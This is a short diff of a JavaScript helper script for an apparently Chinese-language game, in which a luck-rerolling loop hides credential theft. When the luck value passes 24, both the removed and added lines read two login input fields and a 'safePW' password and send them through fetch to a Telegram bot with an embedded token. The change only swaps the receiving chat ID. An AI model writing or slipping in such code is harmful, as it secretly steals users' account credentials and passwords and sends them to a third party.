@@ -85,7 +85,7 @@ async function changeLuck(){
 		    e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
 		    e.write(temp_table2);
 	        if(luckValue>24){
-			let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=7098843533&text="+a+"|"+b+"|"+c);
+			let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
 			delete luckValue;
 	    		break;
 	        }
